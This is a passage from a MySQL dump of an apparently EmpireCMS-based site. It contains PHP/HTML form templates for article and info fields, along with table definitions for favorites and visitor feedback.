value=\\\"1\\\">\r\n      <a href=\\\"SetEnews.php<?=$ecms_hashur[whehref]?>\\\" target=\\\"_blank\\\">加水印</a>)&nbsp;&nbsp; \r\n      <input name=\\\"copyflash\\\" type=\\\"checkbox\\\" id=\\\"copyflash\\\" value=\\\"1\\\">\r\n      远程保存FLASH(地址前缀： \r\n      <input name=\\\"qz_url\\\" type=\\\"text\\\" id=\\\"qz_url\\\" size=\\\"\\\">\r\n              )</td>\r\n          </tr>\r\n          <tr>\r\n            \r\n    <td bgcolor=\\\"#FFFFFF\\\"><input name=\\\"repimgnexturl\\\" type=\\\"checkbox\\\" id=\\\"repimgnexturl\\\" value=\\\"1\\\"> 图片链接转为下一页&nbsp;&nbsp; <input name=\\\"autopage\\\" type=\\\"checkbox\\\" id=\\\"autopage\\\" value=\\\"1\\\"> 自动分页\r\n      ,每 \r\n      <input name=\\\"autosize\\\" type=\\\"text\\\" id=\\\"autosize\\\" value=\\\"5000\\\" size=\\\"5\\\">\r\n      个字节为一页&nbsp;&nbsp; 取第 \r\n      <input name=\\\"getfirsttitlepic\\\" type=\\\"text\\\" id=\\\"getfirsttitlepic\\\" value=\\\"\\\" size=\\\"1\\\">\r\n      张上传图为标题图片( \r\n      <input name=\\\"getfirsttitlespic\\\" type=\\\"checkbox\\\" id=\\\"getfirsttitlespic\\\" value=\\\"1\\\">\r\n      缩略图: 宽 \r\n      <input name=\\\"getfirsttitlespicw\\\" type=\\\"text\\\" id=\\\"getfirsttitlespicw\\\" size=\\\"3\\\" value=\\\"<?=$public_r[spicwidth]?>\\\">\r\n      *高\r\n      <input name=\\\"getfirsttitlespich\\\" type=\\\"text\\\" id=\\\"getfirsttitlespich\\\" size=\\\"3\\\" value=\\\"<?=$public_r[spicheight]?>\\\">\r\n      )</td>\r\n          </tr>\r\n        </table>\r\n','',1,1,1,'\r\n  <tr bgcolor=\\\"#FFFFFF\\\"> \r\n    <td height=\\\"22\\\" valign=\\\"top\\\"><strong>[!--enews.name--]正则：</strong><br>\r\n      (<input name=\\\"textfield\\\" type=\\\"text\\\" id=\\\"textfield\\\" value=\\\"[!--newstext--]\\\" size=\\\"20\\\">)</td>\r\n    <td><table width=\\\"100%\\\" border=\\\"0\\\" cellspacing=\\\"1\\\" cellpadding=\\\"3\\\">\r\n        <tr> \r\n          <td><textarea name=\\\"add[zz_newstext]\\\" cols=\\\"60\\\" rows=\\\"10\\\" id=\\\"textarea\\\"><?=ehtmlspecialchars(stripSlashes($r[zz_newstext]))?></textarea></td>\r\n        </tr>\r\n        <tr> \r\n          <td><input name=\\\"add[z_newstext]\\\" type=\\\"text\\\" id=\\\"add[z_newstext]\\\" value=\\\"<?=stripSlashes($r[z_newstext])?>\\\">\r\n            (如填写这里，将为字段的值)</td>\r\n        </tr>\r\n      </table></td>\r\n  </tr>\r\n',2,'CHAR','50',1,7,'article',1,'',0,1,1,'<?=ECMS_ShowEditorVar(\\\"newstext\\\",$ecmsfirstpost==1?\\\"\\\":DoReqValue($mid,\\\'newstext\\\',stripSlashes($r[newstext])),\\\"Default\\\",\\\"\\\",\\\"300\\\",\\\"100%\\\")?>\r\n',0,'',0,'',0,1,'','','','','','',0,0,''),(97,'diggtop','顶','text','\r\n<input name=\\\"diggtop\\\" type=\\\"text\\\" id=\\\"diggtop\\\" value=\\\"<?=$ecmsfirstpost==1?\\\"\\\":ehtmlspecialchars(stripSlashes($r[diggtop]))?>\\\" size=\\\"\\\">\r\n','',1,1,1,'\r\n  <tr bgcolor=\\\"#FFFFFF\\\"> \r\n    <td height=\\\"22\\\" valign=\\\"top\\\"><strong>[!--enews.name--]正则：</strong><br>\r\n      (<input name=\\\"textfield\\\" type=\\\"text\\\" id=\\\"textfield\\\" value=\\\"[!--diggtop--]\\\" size=\\\"20\\\">)</td>\r\n    <td><table width=\\\"100%\\\" border=\\\"0\\\" cellspacing=\\\"1\\\" cellpadding=\\\"3\\\">\r\n        <tr> \r\n          <td><textarea name=\\\"add[zz_diggtop]\\\" cols=\\\"60\\\" rows=\\\"10\\\" id=\\\"textarea\\\"><?=ehtmlspecialchars(stripSlashes($r[zz_diggtop]))?></textarea></td>\r\n        </tr>\r\n        <tr> \r\n          <td><input name=\\\"add[z_diggtop]\\\" type=\\\"text\\\" id=\\\"add[z_diggtop]\\\" value=\\\"<?=stripSlashes($r[z_diggtop])?>\\\">\r\n            (如填写这里，将为字段的值)</td>\r\n        </tr>\r\n      </table></td>\r\n  </tr>\r\n',3,'INT','',1,7,'article',0,'',0,0,1,'\r\n<input name=\\\"diggtop\\\" type=\\\"text\\\" id=\\\"diggtop\\\" value=\\\"<?=$ecmsfirstpost==1?\\\"\\\":DoReqValue($mid,\\\'diggtop\\\',stripSlashes($r[diggtop]))?>\\\" size=\\\"\\\">\r\n',0,'',0,'',0,0,'','','','','','',0,0,''),(98,'title','标题','text','<table width=\\\"100%\\\" border=\\\"0\\\" cellpadding=\\\"0\\\" cellspacing=\\\"0\\\" bgcolor=\\\"#DBEAF5\\\">\r\n<tr> \r\n  <td height=\\\"25\\\" bgcolor=\\\"#FFFFFF\\\">\r\n	<?=$tts?\\\"<select name=\\\'ttid\\\'><option value=\\\'0\\\'>标题分类</option>$tts</select>\\\":\\\"\\\"?>\r\n	<input type=text name=title value=\\\"<?=ehtmlspecialchars(stripSlashes($r[title]))?>\\\" size=\\\"60\\\"> \r\n	<input type=\\\"button\\\" name=\\\"button\\\" value=\\\"图文\\\" onclick=\\\"document.add.title.value=document.add.title.value+\\\'(图文)\\\';\\\"> \r\n  </td>\r\n</tr>\r\n<tr> \r\n  <td height=\\\"25\\\" bgcolor=\\\"#FFFFFF\\\">属性: \r\n	<input name=\\\"titlefont[b]\\\" type=\\\"checkbox\\\" value=\\\"b\\\"<?=$titlefontb?>>粗体\r\n	<input name=\\\"titlefont[i]\\\" type=\\\"checkbox\\\" value=\\\"i\\\"<?=$titlefonti?>>斜体\r\n	<input name=\\\"titlefont[s]\\\" type=\\\"checkbox\\\" value=\\\"s\\\"<?=$titlefonts?>>删除线\r\n	&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;颜色: <input name=\\\"titlecolor\\\" type=\\\"text\\\" value=\\\"<?=stripSlashes($r[titlecolor])?>\\\" size=\\\"10\\\" class=\\\"color\\\">\r\n  </td>\r\n</tr>\r\n</table>\r\n','标题',0,1,1,'\r\n  <tr bgcolor=\"#FFFFFF\"> \r\n    <td height=\"22\" valign=\"top\"><strong>[!--enews.name--]正则：</strong><br>\r\n      (<input name=\"textfield\" type=\"text\" id=\"textfield\" value=\"[!--title--]\" size=\"20\">)</td>\r\n    <td><table width=\"100%\" border=\"0\" cellspacing=\"1\" cellpadding=\"3\">\r\n        <tr> \r\n          <td><textarea name=\"add[zz_title]\" cols=\"60\" rows=\"10\" id=\"textarea\"><?=ehtmlspecialchars(stripSlashes($r[zz_title]))?></textarea></td>\r\n        </tr>\r\n        <tr> \r\n          <td><input name=\"add[z_title]\" type=\"text\" id=\"add[z_title]\" value=\"<?=stripSlashes($r[z_title])?>\">\r\n            (如填写这里，将为字段的值)</td>\r\n        </tr>\r\n      </table></td>\r\n  </tr>\r\n',0,'CHAR','100',1,8,'info',0,'',0,0,0,'<input name=\\\"title\\\" type=\\\"text\\\" size=\\\"42\\\" value=\\\"<?=$ecmsfirstpost==1?\\\"\\\":DoReqValue($mid,\\\'title\\\',stripSlashes($r[title]))?>\\\">\r\n',0,'',0,'60',0,0,'','','','','','',0,0,''),(99,'special.field','特殊属性','','\r\n<table width=\"100%\" border=\"0\" cellpadding=\"0\" cellspacing=\"0\" bgcolor=\"#DBEAF5\">\r\n  <tr>\r\n    <td height=\"25\" bgcolor=\"#FFFFFF\">信息属性: \r\n      <input name=\"checked\" type=\"checkbox\" value=\"1\"<?=$r[checked]?\' checked\':\'\'?>>\r\n      审核 &nbsp;&nbsp; 推荐 \r\n      <select name=\"isgood\" id=\"isgood\">\r\n        <option value=\"0\">不推荐</option>\r\n	<?=$ftnr[\'igname\']?>\r\n      </select>\r\n      &nbsp;&nbsp; 头条 \r\n      <select name=\"firsttitle\" id=\"firsttitle\">\r\n        <option value=\"0\">非头条</option>\r\n	<?=$ftnr[\'ftname\']?>\r\n      </select></td>\r\n  </tr>\r\n  <tr> \r\n    <td height=\"25\" bgcolor=\"#FFFFFF\">关键字&nbsp;&nbsp;&nbsp;: \r\n      <input name=\"keyboard\" type=\"text\" size=\"52\" value=\"<?=stripSlashes($r[keyboard])?>\">\r\n      <font color=\"#666666\">(多个请用&quot;,&quot;隔开)</font></td>\r\n  </tr>\r\n  <tr> \r\n    <td height=\"25\" bgcolor=\"#FFFFFF\">外部链接: \r\n      <input name=\"titleurl\" type=\"text\" value=\"<?=stripSlashes($r[titleurl])?>\" size=\"52\">\r\n      <font color=\"#666666\">(填写后信息连接地址将为此链接)</font></td>\r\n  </tr>\r\n</table>\r\n','特殊属性',0,1,0,'\r\n\r\n',0,'','0',0,8,'info',0,'',0,0,0,'\r\n<input name=\"keyboard\" type=\"text\" size=42 value=\"<?=stripSlashes($r[keyboard])?>\">\r\n<font color=\"#666666\">(多个请用&quot;,&quot;隔开)</font>\r\n',0,'',0,'',0,0,'','','','','','',0,0,''),(100,'titlepic','标题图片','img','<input name=\\\"titlepic\\\" type=\\\"text\\\" id=\\\"titlepic\\\" value=\\\"<?=$ecmsfirstpost==1?\\\"\\\":ehtmlspecialchars(stripSlashes($r[titlepic]))?>\\\" size=\\\"45\\\">\r\n<a onclick=\\\"window.open(\\\'ecmseditor/FileMain.php?type=1&classid=<?=$classid?>&infoid=<?=$id?>&filepass=<?=$filepass?>&sinfo=1&doing=1&field=titlepic<?=$ecms_hashur[ehref]?>\\\',\\\'\\\',\\\'width=700,height=550,scrollbars=yes\\\');\\\" title=\\\"选择已上传的图片\\\"><img src=\\\"../data/images/changeimg.gif\\\" border=\\\"0\\\" align=\\\"absbottom\\\"></a> \r\n','标题图片',0,1,1,'\r\n  <tr bgcolor=\"#FFFFFF\"> \r\n    <td height=\"22\" valign=\"top\"><strong>[!--enews.name--]正则：</strong><br>\r\n      ( \r\n      <input name=\"textfield\" type=\"text\" id=\"textfield\" value=\"[!--titlepic--]\" size=\"20\">\r\n      )</td>\r\n    <td><table width=\"100%\" border=\"0\" cellspacing=\"1\" cellpadding=\"3\">\r\n    <tr>\r\n      <td>附件前缀 \r\n        <input name=\"add[qz_titlepic]\" type=\"text\" id=\"add[qz_titlepic]\" value=\"<?=stripSlashes($r[qz_titlepic])?>\"> \r\n        <input name=\"add[save_titlepic]\" type=\"checkbox\" id=\"add[save_titlepic]\" value=\" checked\"<?=$r[save_titlepic]?>>\r\n        远程保存 </td>\r\n    </tr>\r\n    <tr> \r\n      <td><textarea name=\"add[zz_titlepic]\" cols=\"60\" rows=\"10\" id=\"add[zz_titlepic]\"><?=ehtmlspecialchars(stripSlashes($r[zz_titlepic]))?></textarea></td>\r\n    </tr>\r\n    <tr> \r\n      <td><input name=\"add[z_titlepic]\" type=\"text\" id=\"titlepic5\" value=\"<?=stripSlashes($r[z_titlepic])?>\">\r\n        (如填写这里，这就是字段的值)</td>\r\n    </tr>\r\n  </table></td>\r\n  </tr>\r\n',1,'CHAR','120',1,8,'info',0,'',0,0,0,'<input type=\\\"file\\\" name=\\\"titlepicfile\\\" size=\\\"45\\\">\r\n',0,'',0,'60',0,0,'','','','','','',0,0,''),(101,'newstime','发布时间','text','<input name=\\\"newstime\\\" type=\\\"text\\\" value=\\\"<?=$r[newstime]?>\\\" size=\\\"28\\\" class=\\\"Wdate\\\" onClick=\\\"WdatePicker({skin:\\\'default\\\',dateFmt:\\\'yyyy-MM-dd HH:mm:ss\\\'})\\\"><input type=button name=button value=\\\"设为当前时间\\\" onclick=\\\"document.add.newstime.value=\\\'<?=$todaytime?>\\\'\\\">\r\n','发布时间',0,1,1,'\r\n  <tr bgcolor=\"#FFFFFF\"> \r\n    <td height=\"22\" valign=\"top\"><strong>[!--enews.name--]正则：</strong><br>\r\n      (<input name=\"textfield\" type=\"text\" id=\"textfield\" value=\"[!--newstime--]\" size=\"20\">)</td>\r\n    <td><table width=\"100%\" border=\"0\" cellspacing=\"1\" cellpadding=\"3\">\r\n        <tr> \r\n          <td><textarea name=\"add[zz_newstime]\" cols=\"60\" rows=\"10\" id=\"textarea\"><?=ehtmlspecialchars(stripSlashes($r[zz_newstime]))?></textarea></td>\r\n        </tr>\r\n        <tr> \r\n          <td><input name=\"add[z_newstime]\" type=\"text\" id=\"add[z_newstime]\" value=\"<?=stripSlashes($r[z_newstime])?>\">\r\n            (如填写这里，将为字段的值)</td>\r\n        </tr>\r\n      </table></td>\r\n  </tr>\r\n',0,'INT','11',1,8,'info',0,'',1,0,0,'\r\n',0,'',0,'',0,0,'','','','','','',0,0,''),(102,'smalltext','信息内容','textarea','<textarea name=\\\"smalltext\\\" cols=\\\"80\\\" rows=\\\"10\\\" id=\\\"smalltext\\\"><?=$ecmsfirstpost==1?\\\"\\\":ehtmlspecialchars(stripSlashes($r[smalltext]))?></textarea>\r\n','',1,1,1,'\r\n  <tr bgcolor=\\\"#FFFFFF\\\"> \r\n    <td height=\\\"22\\\" valign=\\\"top\\\"><strong>[!--enews.name--]正则：</strong><br>\r\n      (<input name=\\\"textfield\\\" type=\\\"text\\\" id=\\\"textfield\\\" value=\\\"[!--smalltext--]\\\" size=\\\"20\\\">)</td>\r\n    <td><table width=\\\"100%\\\" border=\\\"0\\\" cellspacing=\\\"1\\\" cellpadding=\\\"3\\\">\r\n        <tr> \r\n          <td><textarea name=\\\"add[zz_smalltext]\\\" cols=\\\"60\\\" rows=\\\"10\\\" id=\\\"textarea\\\"><?=ehtmlspecialchars(stripSlashes($r[zz_smalltext]))?></textarea></td>\r\n        </tr>\r\n        <tr> \r\n          <td><input name=\\\"add[z_smalltext]\\\" type=\\\"text\\\" id=\\\"add[z_smalltext]\\\" value=\\\"<?=stripSlashes($r[z_smalltext])?>\\\">\r\n            (如填写这里，将为字段的值)</td>\r\n        </tr>\r\n      </table></td>\r\n  </tr>\r\n',0,'TEXT','',1,8,'info',0,'',0,1,1,'<textarea name=\\\"smalltext\\\" cols=\\\"60\\\" rows=\\\"10\\\" id=\\\"smalltext\\\"><?=$ecmsfirstpost==1?\\\"\\\":DoReqValue($mid,\\\'smalltext\\\',stripSlashes($r[smalltext]))?></textarea>\r\n',0,'',0,'80,10',0,0,'','','','','','',0,1,''),(103,'myarea','所在地','select','<select name=\"myarea\" id=\"myarea\"><option value=\"东城区\"<?=$r[myarea]==\"东城区\"||$ecmsfirstpost==1?\' selected\':\'\'?>>东城区</option><option value=\"西城区\"<?=$r[myarea]==\"西城区\"?\' selected\':\'\'?>>西城区</option><option value=\"崇文区\"<?=$r[myarea]==\"崇文区\"?\' selected\':\'\'?>>崇文区</option><option value=\"宣武区\"<?=$r[myarea]==\"宣武区\"?\' selected\':\'\'?>>宣武区</option><option value=\"朝阳区\"<?=$r[myarea]==\"朝阳区\"?\' selected\':\'\'?>>朝阳区</option><option value=\"海淀区\"<?=$r[myarea]==\"海淀区\"?\' selected\':\'\'?>>海淀区</option><option value=\"丰台区\"<?=$r[myarea]==\"丰台区\"?\' selected\':\'\'?>>丰台区</option><option value=\"石景山区\"<?=$r[myarea]==\"石景山区\"?\' selected\':\'\'?>>石景山区</option><option value=\"通州区\"<?=$r[myarea]==\"通州区\"?\' selected\':\'\'?>>通州区</option><option value=\"昌平区\"<?=$r[myarea]==\"昌平区\"?\' selected\':\'\'?>>昌平区</option><option value=\"大兴区\"<?=$r[myarea]==\"大兴区\"?\' selected\':\'\'?>>大兴区</option><option value=\"其它\"<?=$r[myarea]==\"其它\"?\' selected\':\'\'?>>其它</option></select>','',1,1,1,'\r\n  <tr bgcolor=\\\"#FFFFFF\\\"> \r\n    <td height=\\\"22\\\" valign=\\\"top\\\"><strong>[!--enews.name--]正则：</strong><br>\r\n      (<input name=\\\"textfield\\\" type=\\\"text\\\" id=\\\"textfield\\\" value=\\\"[!--myarea--]\\\" size=\\\"20\\\">)</td>\r\n    <td><table width=\\\"100%\\\" border=\\\"0\\\" cellspacing=\\\"1\\\" cellpadding=\\\"3\\\">\r\n        <tr> \r\n          <td><textarea name=\\\"add[zz_myarea]\\\" cols=\\\"60\\\" rows=\\\"10\\\" id=\\\"textarea\\\"><?=ehtmlspecialchars(stripSlashes($r[zz_myarea]))?></textarea></td>\r\n        </tr>\r\n        <tr> \r\n          <td><input name=\\\"add[z_myarea]\\\" type=\\\"text\\\" id=\\\"add[z_myarea]\\\" value=\\\"<?=stripSlashes($r[z_myarea])?>\\\">\r\n            (如填写这里，将为字段的值)</td>\r\n        </tr>\r\n      </table></td>\r\n  </tr>\r\n',1,'VARCHAR','30',1,8,'info',0,'东城区:default|西城区|崇文区|宣武区|朝阳区|海淀区|丰台区|石景山区|通州区|昌平区|大兴区|其它',0,0,1,'<select name=\"myarea\" id=\"myarea\"><option value=\"东城区\"<?=$r[myarea]==\"东城区\"||$ecmsfirstpost==1?\' selected\':\'\'?>>东城区</option><option value=\"西城区\"<?=$r[myarea]==\"西城区\"?\' selected\':\'\'?>>西城区</option><option value=\"崇文区\"<?=$r[myarea]==\"崇文区\"?\' selected\':\'\'?>>崇文区</option><option value=\"宣武区\"<?=$r[myarea]==\"宣武区\"?\' selected\':\'\'?>>宣武区</option><option value=\"朝阳区\"<?=$r[myarea]==\"朝阳区\"?\' selected\':\'\'?>>朝阳区</option><option value=\"海淀区\"<?=$r[myarea]==\"海淀区\"?\' selected\':\'\'?>>海淀区</option><option value=\"丰台区\"<?=$r[myarea]==\"丰台区\"?\' selected\':\'\'?>>丰台区</option><option value=\"石景山区\"<?=$r[myarea]==\"石景山区\"?\' selected\':\'\'?>>石景山区</option><option value=\"通州区\"<?=$r[myarea]==\"通州区\"?\' selected\':\'\'?>>通州区</option><option value=\"昌平区\"<?=$r[myarea]==\"昌平区\"?\' selected\':\'\'?>>昌平区</option><option value=\"大兴区\"<?=$r[myarea]==\"大兴区\"?\' selected\':\'\'?>>大兴区</option><option value=\"其它\"<?=$r[myarea]==\"其它\"?\' selected\':\'\'?>>其它</option></select>',0,'',0,'',0,0,'','','','','','',0,0,''),(104,'email','邮箱','text','<input name=\\\"email\\\" type=\\\"text\\\" id=\\\"email\\\" value=\\\"<?=$ecmsfirstpost==1?$memberinfor[email]:ehtmlspecialchars(stripSlashes($r[email]))?>\\\" size=\\\"60\\\">\r\n','',1,1,1,'\r\n  <tr bgcolor=\\\"#FFFFFF\\\"> \r\n    <td height=\\\"22\\\" valign=\\\"top\\\"><strong>[!--enews.name--]正则：</strong><br>\r\n      (<input name=\\\"textfield\\\" type=\\\"text\\\" id=\\\"textfield\\\" value=\\\"[!--email--]\\\" size=\\\"20\\\">)</td>\r\n    <td><table width=\\\"100%\\\" border=\\\"0\\\" cellspacing=\\\"1\\\" cellpadding=\\\"3\\\">\r\n        <tr> \r\n          <td><textarea name=\\\"add[zz_email]\\\" cols=\\\"60\\\" rows=\\\"10\\\" id=\\\"textarea\\\"><?=ehtmlspecialchars(stripSlashes($r[zz_email]))?></textarea></td>\r\n        </tr>\r\n        <tr> \r\n          <td><input name=\\\"add[z_email]\\\" type=\\\"text\\\" id=\\\"add[z_email]\\\" value=\\\"<?=stripSlashes($r[z_email])?>\\\">\r\n            (如填写这里，将为字段的值)</td>\r\n        </tr>\r\n      </table></td>\r\n  </tr>\r\n',2,'VARCHAR','80',1,8,'info',0,'$memberinfor[email]',0,0,1,'<input name=\\\"email\\\" type=\\\"text\\\" id=\\\"email\\\" value=\\\"<?=$ecmsfirstpost==1?$memberinfor[email]:DoReqValue($mid,\\\'email\\\',stripSlashes($r[email]))?>\\\" size=\\\"46\\\">\r\n',0,'',0,'46',1,0,'','','','','','',0,0,''),(105,'mycontact','联系方式','text','<input name=\\\"mycontact\\\" type=\\\"text\\\" id=\\\"mycontact\\\" value=\\\"<?=$ecmsfirstpost==1?\\\"\\\":ehtmlspecialchars(stripSlashes($r[mycontact]))?>\\\" size=\\\"60\\\">\r\n','',1,1,1,'\r\n  <tr bgcolor=\\\"#FFFFFF\\\"> \r\n    <td height=\\\"22\\\" valign=\\\"top\\\"><strong>[!--enews.name--]正则：</strong><br>\r\n      (<input name=\\\"textfield\\\" type=\\\"text\\\" id=\\\"textfield\\\" value=\\\"[!--mycontact--]\\\" size=\\\"20\\\">)</td>\r\n    <td><table width=\\\"100%\\\" border=\\\"0\\\" cellspacing=\\\"1\\\" cellpadding=\\\"3\\\">\r\n        <tr> \r\n          <td><textarea name=\\\"add[zz_mycontact]\\\" cols=\\\"60\\\" rows=\\\"10\\\" id=\\\"textarea\\\"><?=ehtmlspecialchars(stripSlashes($r[zz_mycontact]))?></textarea></td>\r\n        </tr>\r\n        <tr> \r\n          <td><input name=\\\"add[z_mycontact]\\\" type=\\\"text\\\" id=\\\"add[z_mycontact]\\\" value=\\\"<?=stripSlashes($r[z_mycontact])?>\\\">\r\n            (如填写这里，将为字段的值)</td>\r\n        </tr>\r\n      </table></td>\r\n  </tr>\r\n',2,'VARCHAR','255',1,8,'info',0,'',0,0,1,'<input name=\\\"mycontact\\\" type=\\\"text\\\" id=\\\"mycontact\\\" value=\\\"<?=$ecmsfirstpost==1?\\\"\\\":DoReqValue($mid,\\\'mycontact\\\',stripSlashes($r[mycontact]))?>\\\" size=\\\"46\\\">\r\n',0,'',0,'46',1,0,'','','','','','',0,0,''),(106,'address','联系地址','text','<input name=\\\"address\\\" type=\\\"text\\\" id=\\\"address\\\" value=\\\"<?=$ecmsfirstpost==1?$memberinfor[address]:ehtmlspecialchars(stripSlashes($r[address]))?>\\\" size=\\\"60\\\">\r\n','',1,1,1,'\r\n  <tr bgcolor=\\\"#FFFFFF\\\"> \r\n    <td height=\\\"22\\\" valign=\\\"top\\\"><strong>[!--enews.name--]正则：</strong><br>\r\n      (<input name=\\\"textfield\\\" type=\\\"text\\\" id=\\\"textfield\\\" value=\\\"[!--address--]\\\" size=\\\"20\\\">)</td>\r\n    <td><table width=\\\"100%\\\" border=\\\"0\\\" cellspacing=\\\"1\\\" cellpadding=\\\"3\\\">\r\n        <tr> \r\n          <td><textarea name=\\\"add[zz_address]\\\" cols=\\\"60\\\" rows=\\\"10\\\" id=\\\"textarea\\\"><?=ehtmlspecialchars(stripSlashes($r[zz_address]))?></textarea></td>\r\n        </tr>\r\n        <tr> \r\n          <td><input name=\\\"add[z_address]\\\" type=\\\"text\\\" id=\\\"add[z_address]\\\" value=\\\"<?=stripSlashes($r[z_address])?>\\\">\r\n            (如填写这里，将为字段的值)</td>\r\n        </tr>\r\n      </table></td>\r\n  </tr>\r\n',2,'VARCHAR','255',1,8,'info',0,'$memberinfor[address]',0,0,1,'<input name=\\\"address\\\" type=\\\"text\\\" id=\\\"address\\\" value=\\\"<?=$ecmsfirstpost==1?$memberinfor[address]:DoReqValue($mid,\\\'address\\\',stripSlashes($r[address]))?>\\\" size=\\\"46\\\">\r\n',0,'',0,'46',1,0,'','','','','','',0,0,'');
/*!40000 ALTER TABLE `libang_enewsf` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `libang_enewsfava`
--

DROP TABLE IF EXISTS `libang_enewsfava`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `libang_enewsfava` (
  `favaid` bigint(20) NOT NULL AUTO_INCREMENT,
  `id` int(11) NOT NULL DEFAULT '0',
  `favatime` datetime NOT NULL DEFAULT '0000-00-00 00:00:00',
  `userid` int(11) NOT NULL DEFAULT '0',
  `username` varchar(30) NOT NULL DEFAULT '',
  `classid` smallint(6) NOT NULL DEFAULT '0',
  `cid` int(11) NOT NULL DEFAULT '0',
  PRIMARY KEY (`favaid`),
  KEY `userid` (`userid`),
  KEY `cid` (`cid`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `libang_enewsfava`
--

LOCK TABLES `libang_enewsfava` WRITE;
/*!40000 ALTER TABLE `libang_enewsfava` DISABLE KEYS */;
/*!40000 ALTER TABLE `libang_enewsfava` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `libang_enewsfavaclass`
--

DROP TABLE IF EXISTS `libang_enewsfavaclass`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `libang_enewsfavaclass` (
  `cid` int(11) NOT NULL AUTO_INCREMENT,
  `cname` varchar(30) NOT NULL DEFAULT '',
  `userid` int(11) NOT NULL DEFAULT '0',
  PRIMARY KEY (`cid`),
  KEY `userid` (`userid`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `libang_enewsfavaclass`
--

LOCK TABLES `libang_enewsfavaclass` WRITE;
/*!40000 ALTER TABLE `libang_enewsfavaclass` DISABLE KEYS */;
/*!40000 ALTER TABLE `libang_enewsfavaclass` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `libang_enewsfeedback`
--

DROP TABLE IF EXISTS `libang_enewsfeedback`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `libang_enewsfeedback` (
  `id` int(10) unsigned NOT NULL AUTO_INCREMENT,
  `bid` smallint(5) unsigned NOT NULL DEFAULT '0',
  `title` varchar(120) NOT NULL DEFAULT '',
  `saytext` text NOT NULL,
  `name` varchar(30) NOT NULL DEFAULT '',
  `email` varchar(80) NOT NULL DEFAULT '',
  `mycall` varchar(30) NOT NULL DEFAULT '',
  `homepage` varchar(160) NOT NULL DEFAULT '',
  `company` varchar(80) NOT NULL DEFAULT '',
  `address` varchar(255) NOT NULL DEFAULT '',
  `saytime` datetime NOT NULL DEFAULT '0000-00-00 00:00:00',
  `job` varchar(36) NOT NULL DEFAULT '',
  `ip` varchar(20) NOT NULL DEFAULT '',
  `filepath` varchar(20) NOT NULL DEFAULT '',
  `filename` text NOT NULL,
  `userid` mediumint(8) unsigned NOT NULL DEFAULT '0',
  `username` varchar(20) NOT NULL DEFAULT '',
  `haveread` tinyint(1) NOT NULL DEFAULT '0',
  `eipport` varchar(6) NOT NULL DEFAULT '',
  PRIMARY KEY (`id`),
  KEY `bid` (`bid`),
  KEY `haveread` (`haveread`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `libang_enewsfeedback`
--

LOCK TABLES `libang_enewsfeedback` WRITE;
/*!40000 ALTER TABLE `libang_enewsfeedback` DISABLE KEYS */;
/*!40000 ALTER TABLE `libang_enewsfeedback` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `libang_enewsfeedbackclass`
--

DROP TABLE IF EXISTS `libang_enewsfeedbackclass`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `libang_enewsfeedbackclass` (
  `bid` smallint(5) unsigned NOT NULL AUTO_INCREMENT,
  `bname` varchar(60) NOT NULL DEFAULT '',
  `btemp` mediumtext NOT NULL,
  `bzs` varchar(255) NOT NULL DEFAULT '',
  `enter` text NOT NULL,
  `mustenter` text NOT NULL,
  `filef` varchar(255) NOT NULL DEFAULT '',
  `groupid` smallint(6) NOT NULL DEFAULT '0',
  `checkboxf` text NOT NULL,
  `usernames` text NOT NULL,
  PRIMARY KEY (`bid`)
) ENGINE=MyISAM AUTO_INCREMENT=2 DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `libang_enewsfeedbackclass`
--

LOCK TABLES `libang_enewsfeedbackclass` WRITE;
/*!40000 ALTER TABLE `libang_enewsfeedbackclass` DISABLE KEYS */;
INSERT INTO `libang_enewsfeedbackclass` VALUES (1,'默认反馈分类','[!--cp.header--]\r\n<table width=100% align=center cellpadding=3 cellspacing=1 class=\\\"tableborder\\\">\r\n  <form name=\\\'feedback\\\' method=\\\'post\\\' enctype=\\\'multipart/form-data\\\' action=\\\'../../enews/index.php\\\'>\r\n    <input name=\\\'enews\\\' type=\\\'hidden\\\' value=\\\'AddFeedback\\\'>\r\n    <tr>\r\n      <td width=\\\'16%\\\' height=25 bgcolor=\\\'ffffff\\\'><div align=\\\"right\\\">您的姓名:</div></td>\r\n      <td bgcolor=\\\'ffffff\\\'><input name=\\\'name\\\' type=\\\'text\\\' size=\\\'42\\\'>\r\n        (*)</td>\r\n    </tr>\r\n    <tr>\r\n      <td width=\\\'16%\\\' height=25 bgcolor=\\\'ffffff\\\'><div align=\\\"right\\\">职务:</div></td>\r\n      <td bgcolor=\\\'ffffff\\\'><input name=\\\'job\\\' type=\\\'text\\\' size=\\\'42\\\'></td>\r\n    </tr>\r\n    <tr>\r\n      <td width=\\\'16%\\\' height=25 bgcolor=\\\'ffffff\\\'><div align=\\\"right\\\">公司名称:</div></td>\r\n      <td bgcolor=\\\'ffffff\\\'><input name=\\\'company\\\' type=\\\'text\\\' size=\\\'42\\\'></td>\r\n    </tr>\r\n    <tr>\r\n      <td width=\\\'16%\\\' height=25 bgcolor=\\\'ffffff\\\'><div align=\\\"right\\\">联系邮箱:</div></td>\r\n      <td bgcolor=\\\'ffffff\\\'><input name=\\\'email\\\' type=\\\'text\\\' size=\\\'42\\\'></td>\r\n    </tr>\r\n    <tr>\r\n      <td width=\\\'16%\\\' height=25 bgcolor=\\\'ffffff\\\'><div align=\\\"right\\\">联系电话:</div></td>\r\n      <td bgcolor=\\\'ffffff\\\'><input name=\\\'mycall\\\' type=\\\'text\\\' 